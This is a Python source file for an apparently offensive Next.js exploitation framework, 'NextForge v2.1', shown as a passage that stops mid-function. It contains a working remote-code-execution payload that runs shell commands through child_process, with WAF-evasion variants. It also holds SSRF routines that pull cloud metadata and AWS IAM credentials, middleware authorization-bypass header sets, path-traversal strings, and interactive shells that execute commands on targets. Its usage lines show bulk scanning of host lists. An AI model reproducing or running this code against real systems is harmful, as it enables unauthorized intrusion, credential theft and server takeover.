#!/usr/bin/env python3
"""
NextForge v2.1 — Unified Next.js Exploitation Framework
Author  : Mitsec (@ynsmroztas)

CVE Coverage:
  CVE-2026-44578  — WebSocket Upgrade SSRF (self-hosted)
  CVE-2025-55182  — RSC Server Action RCE (React2Shell)
  CVE-2025-66478  — RSC Prototype Pollution RCE
  CVE-2025-29927  — Middleware Authorization Bypass
  CVE-2026-44575  — App Router segment-prefetch / .rsc bypass
  CVE-2026-44574  — Dynamic route parameter injection bypass
  CVE-2026-44573  — Pages Router i18n middleware bypass
  CVE-2026-45109  — Turbopack auth bypass
  CVE-2026-64642  — Turbopack + single-locale middleware bypass
  CVE-2026-64643  — Unauth Server Function / action-id disclosure
  CVE-2026-64649  — Server Action Host-header SSRF (custom server)
  CVE-2026-75604  — Windows incremental-cache path traversal → key leak
  CVE-2025-55183  — RSC Server Function source disclosure

--auto = FULL POWER
  - Full WAF matrix for RCE
  - SSRF + cloud detection + deep internal
  - Multiple middleware bypass techniques
  - Automatic interactive shell on hit

Usage:
  python3 nextforge.py -u https://target.com --full
  python3 nextforge.py -t https://target.com --full --oast xyz.oastify.com
  python3 nextforge.py -t https://target.com --auto --shell
  cat hosts.txt | python3 nextforge.py --pipe --full -o hits.jsonl
"""

import argparse, base64, json, os, re, signal, socket, ssl, sys, threading, time
import urllib.request
from datetime import datetime
from queue import Empty, Queue
from urllib.parse import urljoin, unquote, urlparse

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# ── Colors ───────────────────────────────────────────────────
R="\033[91m"; G="\033[92m"; Y="\033[93m"; C="\033[96m"; W="\033[97m"
DIM="\033[2m"; RESET="\033[0m"; BOLD="\033[1m"; M="\033[95m"
ORANGE="\033[38;5;214m"; TEAL="\033[38;5;43m"; VIOLET="\033[38;5;141m"
GOLD="\033[38;5;220m"; SILVER="\033[38;5;245m"

PRINT_LOCK = threading.Lock()
def safe_print(msg):
    with PRINT_LOCK:
        print(msg, flush=True)

def banner():
    print(f"""
{VIOLET}{BOLD}══════════════════════════════════════════════════════════════{RESET}
{VIOLET}{BOLD}  NextForge v2.1{RESET}  {SILVER}— Unified Next.js Exploitation Framework{RESET}
{SILVER}  RCE · SSRF · Middleware · Full WAF Matrix · Auto Shell{RESET}
{SILVER}  CVE-2026-44578 · 55182 · 66478 · 29927 · 44575 · 44574 · 64642{RESET}
{ORANGE}  @mitsec / ynsmroztas{RESET}
{VIOLET}{BOLD}══════════════════════════════════════════════════════════════{RESET}
""")

def info(m):  safe_print(f"{G}[+]{RESET} {m}")
def warn(m):  safe_print(f"{Y}[!]{RESET} {m}")
def err(m):   safe_print(f"{R}[-]{RESET} {m}")
def step(m):  safe_print(f"{C}[>]{RESET} {BOLD}{m}{RESET}")
def dim(m):   safe_print(f"  {DIM}{m}{RESET}")
def hit(m):   safe_print(f"\n{R}{'█'*60}{RESET}\n{R}{BOLD}  ⚡ {m}{RESET}\n{R}{'█'*60}{RESET}\n")
def hdr(m):   safe_print(f"\n{Y}{'═'*60}{RESET}\n  {BOLD}{m}{RESET}\n{Y}{'═'*60}{RESET}")
def sc(code):
    if code == 200: return G
    if code in (301,302,304,307,308,401,403): return Y
    if code >= 500: return R
    return DIM

# ── Evidence / Curl / Report helpers ─────────────────────────
EVIDENCE_DIR = "evidence"

def ensure_evidence_dir():
    os.makedirs(EVIDENCE_DIR, exist_ok=True)

def safe_name(s):
    return re.sub(r'[^a-zA-Z0-9._-]+', '_', s)[:80]

def save_evidence(target, cve, label, content):
    ensure_evidence_dir()
    host = urlparse(target).hostname or "target"
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = f"{safe_name(host)}_{safe_name(cve)}_{safe_name(label)}_{ts}.txt"
    path = os.path.join(EVIDENCE_DIR, fname)
    with open(path, "w", errors="replace") as f:
        f.write(content if isinstance(content, str) else str(content))
    return path

def print_curl_box(title, curls):
    safe_print(f"\n  {GOLD}┌─ {title}{RESET}")
    for c in curls:
        safe_print(f"  {GOLD}│{RESET} {C}{c}{RESET}")
    safe_print(f"  {GOLD}└{'─'*50}{RESET}")

def print_report_snippet(cve, severity, target, detail, curls, impact, evidence_path=None):
    safe_print(f"\n{VIOLET}{'─'*60}{RESET}")
    safe_print(f"  {BOLD}REPORT SNIPPET{RESET}  {SILVER}(copy for Intigriti/Bugcrowd){RESET}")
    safe_print(f"{VIOLET}{'─'*60}{RESET}")
    block = f"""## {cve}

**Severity:** {severity}
**Target:** `{target}`
**Detail:** {detail}

### Steps to Reproduce
1. Send the following request(s):
```bash
{chr(10).join(curls)}
```
2. Observe unauthorized access / sensitive response.

### Impact
{impact}
"""
    if evidence_path:
        block += f"\n### Evidence\nSaved to: `{evidence_path}`\n"
    for line in block.splitlines():
        safe_print(f"  {line}")
    safe_print(f"{VIOLET}{'─'*60}{RESET}\n")

PROTECTED_MARKERS = (
    "admin", "dashboard", "logout", "settings", "account", "panel",
    "console", "manage", "sign out", "signout", "profile", "users",
    "role", "permission", "api key", "secret"
)

def looks_protected(body):
    b = (body or "").lower()
    return any(m in b for m in PROTECTED_MARKERS)

# ── Constants ────────────────────────────────────────────────
WS_KEY = "dGhlIHNhbXBsZSBub25jZQ=="
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
BASE_HEADERS = {"User-Agent": UA, "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5"}
WAF_HEADERS = {**BASE_HEADERS, "X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1",
               "CF-Connecting-IP": "127.0.0.1", "Origin": "https://localhost", "Referer": "https://localhost/"}
VERCEL_HEADERS = {**WAF_HEADERS, "X-Vercel-Forwarded-For": "127.0.0.1", "X-Vercel-Id": "iad1::fake"}

# ── Profile ──────────────────────────────────────────────────
def parse_target(url):
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    p = urlparse(url)
    return p.hostname, p.port or (443 if p.scheme == "https" else 80), p.scheme == "https", url.rstrip("/")

def detect_nextjs(target, timeout=8):
    profile = {"is_nextjs": False, "version_str": "unknown", "router": "unknown",
               "middleware": False, "turbopack": False, "potential": [], "url": target}
    try:
        req = urllib.request.Request(target, headers=BASE_HEADERS)
        with urllib.request.urlopen(req, timeout=timeout, context=CTX) as r:
            body = r.read(16384).decode(errors="replace")
            hdrs = dict(r.headers)
    except Exception:
        return profile
    xpb = hdrs.get("X-Powered-By", "") + hdrs.get("x-powered-by", "")
    if any(s in xpb or s in body for s in ("Next.js", "/_next/static", "__NEXT_DATA__", "__next_f")):
        profile["is_nextjs"] = True
    if not profile["is_nextjs"]:
        return profile
    if "__next_f" in body:
        profile["router"] = "App Router"
        profile["potential"] += ["CVE-2025-55182", "CVE-2025-66478", "CVE-2026-44575"]
    elif "__NEXT_DATA__" in body:
        profile["router"] = "Pages Router"
        profile["potential"] += ["CVE-2025-29927", "CVE-2026-44573"]
    if "turbopack" in body.lower() or "__turbopack" in body.lower():
        profile["turbopack"] = True
        profile["potential"] += ["CVE-2026-45109", "CVE-2026-64642"]
    if any(h in hdrs for h in ("x-middleware-rewrite", "x-middleware-next", "x-middleware-redirect")):
        profile["middleware"] = True
        profile["potential"] += ["CVE-2025-29927", "CVE-2026-44574", "CVE-2026-44575"]
    for pat in [r'/_next/static/[^/]+/(?:webpack-)?([0-9]+\.[0-9]+\.[0-9]+)',
                r'Next\.js[/\s]+([0-9]+\.[0-9]+\.[0-9]+)', r'"next":\s*"([0-9]+\.[0-9]+\.[0-9]+)']:
        m = re.search(pat, body)
        if m:
            profile["version_str"] = m.group(1)
            break
    if profile["version_str"] == "unknown" and "Next.js" in xpb:
        v = xpb.replace("Next.js", "").strip()
        if re.match(r"[0-9]+\.[0-9]+", v):
            profile["version_str"] = v
    profile["potential"].append("CVE-2026-44578")
    profile["potential"] = list(dict.fromkeys(profile["potential"]))
    return profile

# ── SSRF ─────────────────────────────────────────────────────
def ssrf_request(host, port, use_ssl, ssrf_url, timeout=8):
    raw = (f"GET {ssrf_url} HTTP/1.1\r\nHost: {host}\r\n"
           f"Connection: Upgrade\r\nUpgrade: websocket\r\n"
           f"Sec-WebSocket-Version: 13\r\nSec-WebSocket-Key: {WS_KEY}\r\n"
           f"User-Agent: {UA}\r\n\r\n").encode()
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        if use_ssl:
            s = CTX.wrap_socket(s, server_hostname=host)
        s.sendall(raw)
        s.settimeout(timeout)
        buf = b""
        try:
            while len(buf) < 65536:
                chunk = s.recv(8192)
                if not chunk: break
                buf += chunk
        except socket.timeout:
            pass
        s.close()
        resp = buf.decode(errors="replace")
        m = re.match(r'HTTP/[\d.]+ (\d+)', resp)
        code = int(m.group(1)) if m else 0
        body = resp.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in resp else resp
        return code, body
    except Exception as e:
        return 0, str(e)

def probe_ssrf(host, port, use_ssl, timeout=6):
    for url in ("http://127.0.0.1/", "http://localhost/", "http://169.254.169.254/"):
        code, body = ssrf_request(host, port, use_ssl, url, timeout)
        if code == 200 and body and len(body) > 15:
            if any(x in body for x in ("Welcome to nginx", "hetzner", "ami-id", "instance-id")):
                return True, url, body[:400]
            if "/_next/" not in body and len(body) < 3000:
                return True, url, body[:400]
    return False, None, None

def detect_cloud_via_ssrf(host, port, use_ssl, timeout=6):
    clouds = {}
    probes = [
        ("hetzner", "http://169.254.169.254/", ["hetzner"]),
        ("hetzner", "http://169.254.169.254/hetzner/v1/metadata", ["hostname", "instance-id"]),
        ("aws", "http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id"]),
        ("azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["azEnvironment", "vmId"]),
        ("gcp", "http://metadata.google.internal/computeMetadata/v1/", ["instance/"]),
        ("do", "http://169.254.169.254/metadata/v1.json", ["droplet_id"]),
        ("alibaba", "http://100.100.100.200/latest/meta-data/", ["instance-id"]),
    ]
    for provider, url, hints in probes:
        code, body = ssrf_request(host, port, use_ssl, url, timeout)
        if code != 200 or not body:
            continue
        if provider == "hetzner" and "hetzner" in body.lower():
            clouds["hetzner"] = body[:500]; break
        if hints and any(h.lower() in body.lower() for h in hints):
            clouds[provider] = body[:500]; break
    return clouds

def exploit_hetzner(host, port, use_ssl, timeout=6):
    results = {}
    for name, path in [
        ("hostname", "/hetzner/v1/metadata/hostname"),
        ("instance-id", "/hetzner/v1/metadata/instance-id"),
        ("public-ipv4", "/hetzner/v1/metadata/public-ipv4"),
        ("availability-zone", "/hetzner/v1/metadata/availability-zone"),
        ("region", "/hetzner/v1/metadata/region"),
        ("private-networks", "/hetzner/v1/metadata/private-networks"),
        ("full", "/hetzner/v1/metadata"),
    ]:
        code, body = ssrf_request(host, port, use_ssl, f"http://169.254.169.254{path}", timeout)
        if code == 200 and body.strip():
            results[name] = body.strip()[:400]
    return results

def exploit_aws_basic(host, port, use_ssl, timeout=6):
    results = {}
    for name, path in [
        ("instance-id", "/latest/meta-data/instance-id"),
        ("hostname", "/latest/meta-data/hostname"),
        ("local-ipv4", "/latest/meta-data/local-ipv4"),
        ("ami-id", "/latest/meta-data/ami-id"),
        ("iam-info", "/latest/meta-data/iam/info"),
        ("role-list", "/latest/meta-data/iam/security-credentials/"),
    ]:
        code, body = ssrf_request(host, port, use_ssl, f"http://169.254.169.254{path}", timeout)
        if code == 200 and body.strip():
            results[name] = body.strip()[:500]
    role = (results.get("role-list") or "").splitlines()[0].strip() if results.get("role-list") else None
    if role:
        code, body = ssrf_request(host, port, use_ssl,
            f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}", timeout)
        if code == 200 and "AccessKeyId" in body:
            results["credentials"] = body[:900]
            results["role"] = role
    return results

INTERNAL_TARGETS = [
    ("Localhost", "http://localhost/"), ("127.0.0.1", "http://127.0.0.1/"),
    ("127.1", "http://127.1/"), ("0.0.0.0", "http://0.0.0.0/"),
    ("Nginx status", "http://localhost/nginx_status"),
    ("Apache status", "http://localhost/server-status"),
    ("GitLab", "http://localhost/api/v4/version"),
    ("Internal API", "http://api.internal/"),
    ("K8s API", "http://kubernetes.default.svc/"),
    ("K8s IP", "http://10.96.0.1/"),
    ("Prometheus", "http://localhost/metrics"),
    ("Grafana", "http://localhost/api/health"),
    ("169.254.169.254", "http://169.254.169.254/"),
    ("10.0.0.1", "http://10.0.0.1/"),
    ("192.168.0.1", "http://192.168.0.1/"),
    ("172.16.0.1", "http://172.16.0.1/"),
]

def deep_internal_probe(host, port, use_ssl, timeout=5):
    hits = []
    for desc, url in INTERNAL_TARGETS:
        code, body = ssrf_request(host, port, use_ssl, url, timeout)
        if code == 200 and body and len(body) > 10:
            if "/_next/" in body and "Welcome to nginx" not in body:
                continue
            hits.append({"desc": desc, "url": url, "code": code, "len": len(body)})
    return hits

# ── RCE + Full WAF Matrix ────────────────────────────────────
BNDRY = "----NextForgeRce"
FAKE_BNDRY = "----FakeWAFDecoy"
PAYLOAD_TMPL = (
    '{{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
    '"value":"{{\\"then\\":\\"$B1337\\"}}","_response":{{"_prefix":'
    '"var res=process.mainModule.require(\'child_process\').execSync(\'{cmd}\').toString(\'base64\');'
    'throw Object.assign(new Error(\'x\'),{{digest: res}});","_chunks":"$Q2",'
    '"_formData":{{"get":"$1:constructor:constructor"}}}}}}'
)

def _ascii_ratio(s):
    if not s: return 0.0
    return sum(1 for c in s if 32 <= ord(c) < 127 or c in "\n\r\t") / len(s)

def decode_digest(raw_b64):
    try:
        unescaped = json.loads(f'"{raw_b64}"')
    except Exception:
        unescaped = raw_b64
    for cand in (unescaped, raw_b64):
        for pad in ("", "=", "=="):
            try:
                raw = base64.b64decode(cand + pad)
                decoded = raw.decode("utf-8", errors="replace").strip()
                if decoded and _ascii_ratio(decoded) > 0.70 and "\x00" not in decoded[:40]:
                    return decoded
                if decoded.count("\x00") > len(decoded) * 0.4:
                    try:
                        d16 = raw.decode("utf-16le").strip()
                        if d16 and _ascii_ratio(d16) > 0.80:
                            return d16
                    except Exception:
                        pass
            except Exception:
                continue
    return None

def extract_rce_output(text, headers):
    loc = headers.get("Location", headers.get("location", ""))
    if loc and "out=" in loc:
        try:
            r = decode_digest(unquote(loc.split("out=")[-1].split("&")[0]))
            if r: return r
        except Exception:
            pass
    m = re.search(r'"digest"\s*:\s*"((?:[^"\\]|\\.)*)"', text)
    if m:
        r = decode_digest(m.group(1))
        if r and any(x in r for x in ("uid=", "root:", "nt authority", "/bin/", "gid=")):
            return r
        if r and len(r) > 8 and _ascii_ratio(r) > 0.8:
            return r
    return None

def _body_rce(cmd, utf16=False, junk=False, dup_ct=False, trailing=False, chunked=False):
    pl = PAYLOAD_TMPL.format(cmd=cmd.replace("'", "\\'"))
    if utf16 or dup_ct:
        fhdr = f'--{BNDRY}\r\nContent-Disposition: form-data; name="0"\r\nContent-Type: text/plain; charset=utf-16le\r\n'
        if dup_ct:
            fhdr += "Content-Type: text/plain; charset=utf-8\r\n"
        fhdr += "\r\n"
        body = fhdr.encode() + pl.encode("utf-16le")
        body += f'\r\n--{BNDRY}\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n'.encode()
        body += f'--{BNDRY}\r\nContent-Disposition: form-data; name="2"\r\n\r\n[]\r\n--{BNDRY}--\r\n'.encode()
    else:
        body = (f'--{BNDRY}\r\nContent-Disposition: form-data; name="0"\r\n\r\n{pl}\r\n'
                f'--{BNDRY}\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n'
                f'--{BNDRY}\r\nContent-Disposition: form-data; name="2"\r\n\r\n[]\r\n--{BNDRY}--\r\n').encode()
    if junk:
        body = (f'--{BNDRY}\r\nContent-Disposition: form-data; name="junk"\r\n\r\n' + "A"*1024 + "\r\n").encode() + body
    if trailing:
        body = f'--{BNDRY}-- \r\n'.encode() + body
    if chunked:
        chunks = []
        for i in range(0, len(body), 256):
            c = body[i:i+256]
            chunks.append(f"{len(c):X}\r\n".encode() + c + b"\r\n")
        chunks.append(b"0\r\n\r\n")
        body = b"".join(chunks)
    return body

def _ct_rce(extra):
    if extra.get("dup_boundary"):
        return f"multipart/form-data; boundary={BNDRY}; boundary={FAKE_BNDRY}"
    if extra.get("non_utf8"):
        return f'multipart/form-data; boundary="{BNDRY}"; a="b\x88"'
    if extra.get("json_ct"):
        return f"application/json; boundary={BNDRY}"
    if extra.get("base64_bnd"):
        return f"multipart/form-data; boundary={base64.b64encode(BNDRY.encode()).decode()}"
    return f"multipart/form-data; boundary={BNDRY}"

COMBOS = [
    ("standard",     False, False, False, False, False, BASE_HEADERS,   {}),
    ("utf-16le",     True,  False, False, False, False, BASE_HEADERS,   {}),
    ("junk-KB",      False, True,  False, False, False, WAF_HEADERS,    {}),
    ("vercel",       True,  False, False, False, False, VERCEL_HEADERS, {}),
    ("utf16+junk",   True,  True,  False, False, False, WAF_HEADERS,    {}),
    ("dup-boundary", False, False, False, False, False, BASE_HEADERS,   {"dup_boundary": True}),
    ("non-utf8-hdr", False, False, False, False, False, BASE_HEADERS,   {"non_utf8": True}),
    ("dup-ct-field", False, False, True,  False, False, WAF_HEADERS,    {}),
    ("trailing-sp",  False, False, False, True,  False, WAF_HEADERS,    {}),
    ("chunked",      False, False, False, False, True,  WAF_HEADERS,    {"chunked": True}),
    ("json-ct",      False, False, False, False, False, WAF_HEADERS,    {"json_ct": True}),
    ("base64-bnd",   False, False, False, False, False, WAF_HEADERS,    {"base64_bnd": True}),
]

def exploit_rce(target, cmd="id", full_waf=True, timeout=10):
    if not HAS_REQUESTS:
        return False, None, None
    combos = COMBOS if full_waf else COMBOS[:2]
    for name, utf16, junk, dup_ct, trailing, chunked, hdrs, extra in combos:
        body = _body_rce(cmd, utf16, junk, dup_ct, trailing, chunked)
        h = {**hdrs, "Next-Action": "x", "Content-Type": _ct_rce(extra)}
        if extra.get("chunked") or chunked:
            h["Transfer-Encoding"] = "chunked"
        for path in ["/", "/adfa", "/api", "/_rsc"]:
            try:
                r = requests.post(urljoin(target, path), data=body, headers=h,
                                  verify=False, timeout=timeout, allow_redirects=False)
                out = extract_rce_output(r.text, dict(r.headers))
                if out:
                    return True, out, name
            except Exception:
                continue
    return False, None, None

def rce_exec(target, cmd, full_waf=True, timeout=10):
    ok, out, _ = exploit_rce(target, cmd, full_waf, timeout)
    return out if ok else None

# ── Middleware ───────────────────────────────────────────────
PROTECTED_PATHS = [
    "/admin", "/dashboard", "/api/admin", "/settings", "/account",
    "/panel", "/console", "/manage", "/app", "/portal", "/internal",
    "/api/user", "/api/me", "/me", "/profile", "/users",
]

MW_SUBREQ = [
    "middleware:middleware:middleware:middleware:middleware",
    "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
    "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
    "pages/_middleware",
    "pages/_middleware:pages/_middleware:pages/_middleware:pages/_middleware:pages/_middleware",
    "middleware",
    "src/middleware",
    "src/middleware:nowaf:src/middleware:middleware:middleware",
    "middleware:src/middleware:src/middleware:src/middleware:src/middleware",
]

BYPASS_HEADER_SETS = [
    ("CVE-2025-29927", lambda v: {"x-middleware-subrequest": v}, MW_SUBREQ),
    ("header-x-invoke-path", lambda v: {"x-invoke-path": v, "x-invoke-status": "200"}, ["/admin", "/dashboard"]),
    ("header-x-original-url", lambda v: {"X-Original-URL": v}, ["/admin", "/dashboard"]),
    ("header-x-rewrite-url", lambda v: {"X-Rewrite-URL": v}, ["/admin", "/dashboard"]),
    ("header-nextjs-data", lambda v: {"x-nextjs-data": "1"}, ["1"]),
    ("header-prefetch", lambda v: {"Next-Router-Prefetch": "1", "RSC": "1"}, ["1"]),
    ("header-middleware-prefetch", lambda v: {"x-middleware-prefetch": "1"}, ["1"]),
    ("header-xff-loop", lambda v: {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"}, ["1"]),
    ("header-xfh-self", lambda v: {"X-Forwarded-Host": "localhost", "X-Forwarded-Proto": "https"}, ["1"]),
]

RSC_SUFFIXES = [".rsc", "?_rsc=1", "?_rsc=1dw", "/__PAGE__.rsc"]
ROUTE_INJECT = [
    "?slug=../../../admin", "?slug=..%2f..%2fadmin", "?path=../../../admin",
    "?nextUrl=/admin", "?url=/admin",
]
I18N_PREFIXES = ["", "/en", "/en-US", "/de", "/fr", "/nl", "/it"]
NEXT_DATA_GUESSES = [
    "/_next/data/build/admin.json",
    "/_next/data/development/admin.json",
    "/_next/data/build/dashboard.json",
]


def _mw_hit(cve, path, baseline, status, body, curls, technique):
    return {
        "cve": cve, "path": path, "baseline": baseline, "bypass_status": status,
        "body": (body or "")[:4000], "curls": curls, "technique": technique,
        "detail": f"{technique} {path} ({baseline}→{status})",
    }


def _is_bypass(baseline, status, text):
    if status != 200 or not looks_protected(text):
        return False
    return baseline in (401, 403, 302, 307, 308, 404, 0) or baseline != 200


def probe_middleware(target, timeout=6, collect_all=False):
    """
    Returns (ok, cve, detail, meta).
    collect_all=True (--full): try every technique, keep every hit.
    """
    if not HAS_REQUESTS:
        return False, None, None, {}
    hits = []
    baselines = {}

    def baseline_of(path):
        if path in baselines:
            return baselines[path]
        try:
            r = requests.get(urljoin(target, path), headers=BASE_HEADERS,
                             verify=False, timeout=timeout, allow_redirects=False)
            baselines[path] = r.status_code
        except Exception:
            baselines[path] = 0
        return baselines[path]

    def add(hit):
        hits.append(hit)
        if not collect_all:
            return True
        return False

    # 1) header matrix
    for path in PROTECTED_PATHS:
        url = urljoin(target, path)
        base = baseline_of(path)
        if base == 200:
            continue
        for cve, builder, values in BYPASS_HEADER_SETS:
            for val in values:
                extra = builder(val)
                # some builders take a path, some a dummy
                if cve.startswith("header-x-original") or cve.startswith("header-x-rewrite") or cve.startswith("header-x-invoke"):
                    extra = builder(path)
                try:
                    r = requests.get(url, headers={**BASE_HEADERS, **extra},
                                     verify=False, timeout=timeout, allow_redirects=False)
                except Exception:
                    continue
                if _is_bypass(base, r.status_code, r.text):
                    hname, hval = next(iter(extra.items()))
                    curls = [
                        f'curl -sk -o /dev/null -w "%{{http_code}}\\n" "{url}"',
                        "curl -sk " + " ".join(f'-H "{k}: {v}"' for k, v in extra.items()) + f' "{url}"',
                    ]
                    stop = add(_mw_hit(cve if cve.startswith("CVE") else "CVE-2025-29927",
                                       path, base, 200, r.text, curls, cve + f" {hname}"))
                    if stop:
                        h = hits[0]
                        return True, h["cve"], h["detail"], h

    # 2) CVE-2026-44575 RSC / prefetch path
    for path in PROTECTED_PATHS:
        base = baseline_of(path)
        for suffix in RSC_SUFFIXES:
            bypass_url = urljoin(target, path + suffix)
            try:
                r = requests.get(bypass_url,
                                 headers={**BASE_HEADERS, "RSC": "1", "Accept": "text/x-component",
                                          "Next-Router-Prefetch": "1"},
                                 verify=False, timeout=timeout, allow_redirects=False)
            except Exception:
                continue
            if _is_bypass(base, r.status_code, r.text):
                curls = [
                    f'curl -sk -o /dev/null -w "%{{http_code}}\\n" "{urljoin(target, path)}"',
                    f'curl -sk -H "RSC: 1" -H "Next-Router-Prefetch: 1" "{bypass_url}"',
                ]
                stop = add(_mw_hit("CVE-2026-44575", path + suffix, base, 200, r.text, curls, "rsc-prefetch"))
                if stop:
                    h = hits[0]
                    return True, h["cve"], h["detail"], h

    # 3) CVE-2026-44574 route injection
    for path in PROTECTED_PATHS[:6]:
        base = baseline_of(path)
        for payload in ROUTE_INJECT:
            bypass_url = urljoin(target, path + payload)
            try:
                r = requests.get(bypass_url, headers=BASE_HEADERS, verify=False,
                                 timeout=timeout, allow_redirects=False)
            except Exception:
                continue
            if _is_bypass(base, r.status_code, r.text):
                curls = [
                    f'curl -sk -o /dev/null -w "%{{http_code}}\\n" "{urljoin(target, path)}"',
                    f'curl -sk "{bypass_url}"',
                ]
                stop = add(_mw_hit("CVE-2026-44574", path + payload, base, 200, r.text, curls, "route-inject"))
                if stop:
                    h = hits[0]
                    return True, h["cve"], h["detail"], h

    # 4) CVE-2026-44573 / 64642 i18n + turbopack locale skip
    for loc in I18N_PREFIXES:
        for path in ("/admin", "/dashboard", "/settings"):
            p = f"{loc}{path}" if loc else path
            url = urljoin(target, p)
            base = baseline_of(p)
            if base == 200:
                continue
            for extra in (
                {"x-middleware-subrequest": MW_SUBREQ[0]},
                {"x-next-intl-locale": "en"},
                {"Next-Url": path},
            ):
                try:
                    r = requests.get(url, headers={**BASE_HEADERS, **extra},
                                     verify=False, timeout=timeout, allow_redirects=False)
                except Exception:
                    continue
                if _is_bypass(base, r.status_code, r.text):
                    curls = ["curl -sk " + " ".join(f'-H "{k}: {v}"' for k, v in extra.items()) + f' "{url}"']
                    stop = add(_mw_hit("CVE-2026-44573", p, base, 200, r.text, curls, "i18n-locale"))
                    if stop:
                        h = hits[0]
                        return True, h["cve"], h["detail"], h

    # 5) Pages Router /_next/data
    for p in NEXT_DATA_GUESSES:
        try:
            r = requests.get(urljoin(target, p), headers={**BASE_HEADERS, "x-nextjs-data": "1"},
                             verify=False, timeout=timeout, allow_redirects=False)
        except Exception:
            continue
        if r.status_code == 200 and looks_protected(r.text) and "pageProps" in (r.text or ""):
            curls = [f'curl -sk -H "x-nextjs-data: 1" "{urljoin(target, p)}"']
            stop = add(_mw_hit("CVE-2026-45109", p, 0, 200, r.text, curls, "next-data"))
            if stop:
                h = hits[0]
                return True, h["cve"], h["detail"], h

    if hits:
        h = hits[0]
        h["all"] = hits
        return True, h["cve"], h["detail"], h
    return False, None, None, {"all": []}

# ── Interactive Shells ───────────────────────────────────────
def rce_shell(target, full_waf=True, timeout=10):
    safe_print(f"\n{TEAL}{'═'*60}{RESET}\n  {BOLD}GOD SHELL{RESET}  {SILVER}(RCE){RESET}\n  {DIM}{target}{RESET}\n  {SILVER}help | exit{RESET}\n{TEAL}{'═'*60}{RESET}\n")
    out = rce_exec(target, "id", full_waf, timeout)
    if out:
        safe_print(f"  {G}{out}{RESET}\n")
    while True:
        try:
            cmd = input(f"  {ORANGE}nextforge{RESET}{SILVER}@{RESET}{C}rce{RESET}> ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if not cmd: continue
        if cmd in ("exit", "quit", "q"): break
        if cmd == "help":
            safe_print("  id | whoami | env | uname -a | cat /etc/passwd | exit"); continue
        res = rce_exec(target, cmd, full_waf, timeout)
        safe_print(f"  {res or '(no output)'}")

def ssrf_shell(host, port, use_ssl, timeout=8):
    safe_print(f"\n{C}{'═'*60}{RESET}\n  {BOLD}SSRF SHELL{RESET}  {SILVER}(CVE-2026-44578){RESET}\n  {DIM}{host}:{port}{RESET}\n"
               f"  {SILVER}help | cloud | hetzner | aws | url <http://...> | internal | history | exit{RESET}\n{C}{'═'*60}{RESET}\n")
    history = []
    def do(url):
        code, body = ssrf_request(host, port, use_ssl, url, timeout)
        history.append({"url": url, "code": code, "len": len(body)})
        safe_print(f"  {sc(code)}[HTTP {code}]{RESET} ({len(body)}b)")
        if body.strip():
            for line in body.strip().splitlines()[:18]:
                safe_print(f"  {line}")
    while True:
        try:
            cmd = input(f"  {M}ssrf{RESET}{SILVER}({host[:18]}){RESET}> ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if not cmd: continue
        if cmd in ("exit", "quit", "q"): break
        if cmd == "help":
            safe_print("  cloud | hetzner | aws | internal | url <http://...> | history | exit"); continue
        if cmd == "cloud":
            clouds = detect_cloud_via_ssrf(host, port, use_ssl, timeout)
            info(f"Detected: {', '.join(c.upper() for c in clouds)}" if clouds else "No cloud")
        elif cmd == "hetzner":
            meta = exploit_hetzner(host, port, use_ssl, timeout)
            if meta:
                hdr("Hetzner Metadata")
                for k, v in meta.items():
                    safe_print(f"  {Y}{k:<20}{RESET}: {G}{v}{RESET}")
            else:
                dim("No Hetzner data")
        elif cmd == "aws":
            meta = exploit_aws_basic(host, port, use_ssl, timeout)
            if meta:
                hdr("AWS Metadata")
                for k, v in meta.items():
                    safe_print(f"  {Y}{k:<20}{RESET}: {G}{str(v)[:90]}{RESET}")
            else:
                dim("No AWS data")
        elif cmd == "internal":
            step("Deep internal probe...")
            hits = deep_internal_probe(host, port, use_ssl, timeout)
            for h in hits:
                safe_print(f"  {G}[{h['code']}]{RESET} {h['desc']:<18} {h['url']} ({h['len']}b)")
            if not hits:
                dim("No additional hits")
        elif cmd.startswith("url "):
            u = cmd[4:].strip()
            if not u.startswith("http://"):
                warn("Use http:// only (port 80)")
            else:
                do(u)
        elif cmd == "history":
            for e in history[-12:]:
                safe_print(f"  {sc(e['code'])}[{e['code']}]{RESET} {e['url']} ({e['len']}b)")
        elif cmd.startswith("http://"):
            do(cmd)
        else:
            warn("Unknown — type help")

# ── 2026-07 / 2026-08 extras (safe probes) ───────────────────
ACTION_ID_RE = re.compile(r"\b([0-9a-f]{40,64})\b", re.I)
CHUNK_RE = re.compile(r'/_next/static/chunks/[^"\'>\s\\]+\.js')
SRC_LEAK_MARKERS = (
    "process.env", "use server", "async function", "export async function",
    "DATABASE_URL", "SECRET", "API_KEY", "sk_live", "BEGIN RSA",
)
WIN_TRAVERSAL_PATHS = [
    "/%5c..%5c..%5c..%5cserver",
    "/_next/data/%5c..%5c..%5cserver-reference-manifest.json",
    "/_next/static/%5c..%5c..%5cserver/server-reference-manifest.js",
    "/foo%5c..%5c..%5c..%5cwindows%5cwin.ini",
]


def _http_get(url, headers=None, timeout=8):
    h = dict(BASE_HEADERS)
    if headers:
        h.update(headers)
    if HAS_REQUESTS:
        r = requests.get(url, headers=h, verify=False, timeout=timeout, allow_redirects=False)
